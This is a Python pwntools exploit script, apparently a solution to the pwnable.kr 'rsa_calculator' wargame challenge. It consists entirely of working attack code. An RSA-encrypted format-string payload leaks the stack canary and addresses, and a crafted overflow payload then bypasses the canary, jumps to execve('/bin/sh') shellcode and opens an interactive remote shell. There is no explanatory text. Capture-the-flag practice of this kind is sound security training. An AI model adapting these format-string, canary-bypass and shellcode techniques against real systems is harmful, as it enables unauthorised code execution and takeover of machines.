#!/usr/bin/env python3
from pwn import *
context(arch = 'amd64', os = 'linux')

def xgcd(b, n): # take positive integers a, b as input, and return a triple (g, x, y), such that ax + by = g = gcd(a, b).
    x0, x1, y0, y1 = 1, 0, 0, 1
    while n != 0:
        q, b, n = b // n, n, b % n
        x0, x1 = x1, x0 - q * x1
        y0, y1 = y1, y0 - q * y1
    return  b, x0, y0

def SendLine(process, str):
    process.sendline(str)
    print(str)

def SetKey(process, p : int, q : int, e : int, d : int):
    SendLine(process, '1')
    print(process.recv().decode(), end='')
    SendLine(process, str(p))
    print(process.recv().decode(), end='')
    SendLine(process, str(q))
    print(process.recv().decode(), end='')
    SendLine(process, str(e))
    print(process.recv().decode(), end='')
    SendLine(process, str(d))
    print(process.recv().decode(), end='')

def RSA_encrypt(string : str, n : int, e : int):
    byte_string = string.encode()
    ret = b''
    for x in byte_string:
        ret += pack(pow(x, e, n), 32)

    return ret.hex()

def LeakInfo(process, n, e):
    SendLine(process, '3')
    print(process.recv().decode(), end='')
    SendLine(process, '-1')
    print(process.recv().decode(), end='')
    SendLine(process, RSA_encrypt('0x%205$llx,0x%208$llx,0x%207$llx', n, e))
    print(process.readuntil('- decrypted result -\n').decode(), end='')
    info = process.readline().replace(b'\n', b'').decode()
    print(info)

    info = info.split(',')
    return int(info[0], 16), int(info[1], 16), int(info[2], 16)

def exploit(process, payload):
    print(process.recv().decode(), end='')
    SendLine(Process, '3')
    print(process.recv().decode(), end='')
    SendLine(process, '-1')
    print(process.recv().decode(), end='')
    SendLine(process, payload)

#Process = process(['/home/doublesine/Desktop/rsa_calculator'])
Process = remote('pwnable.kr', 9012)
print(Process.recv().decode(), end='')

p = 30011
q = 30013
n = p * q
phi = (p - 1) * (q - 1)
e = 11
d = xgcd(e, phi)[1]
assert d > 0 and (e * d) % phi == 1

SetKey(Process, p, q, e, d)
canary, rbp, ret_addr = LeakInfo(Process, n, e)
rbp -= 0x100
data_addr = rbp - 0x210
shellcode_start = data_addr + \
                  16 + \
                  16 + \
                  16 + \
                  16 + \
                  16
system_addr = ret_addr - 0x40140a + 0x4007c0
print('----------------------------')
print('canary =', hex(canary))
print('rbp =', hex(rbp))
print('ret_addr =', hex(ret_addr))
print('system_addr', hex(system_addr))
print('data_addr =', hex(data_addr))
print('----------------------------')

shellcode = None
try:
    shellcode = asm('mov rdi, rsp') + \
                asm('mov rax, 59') + \
                asm('xor rsi, rsi') + \
                asm('xor rdx, rdx') + \
                asm('syscall')
except:
    shellcode = bytes.fromhex('4889e748c7c03b0000004831f64831d20f05')

whatever_you_want = 123
payload = pack(whatever_you_want, 64).hex().encode().hex() + \
          pack(canary, 64).hex().encode().hex() + \
          pack(rbp & 0xffffffffffff0000, 64).hex().encode().hex() + \
          pack(shellcode_start, 64).hex().encode().hex() + \
          b'/bin/sh\x00'.hex().encode().hex() + \
          shellcode.hex()

payload += 'a' * (1024 - len(payload))
exploit(Process, payload)

Process.interactive()



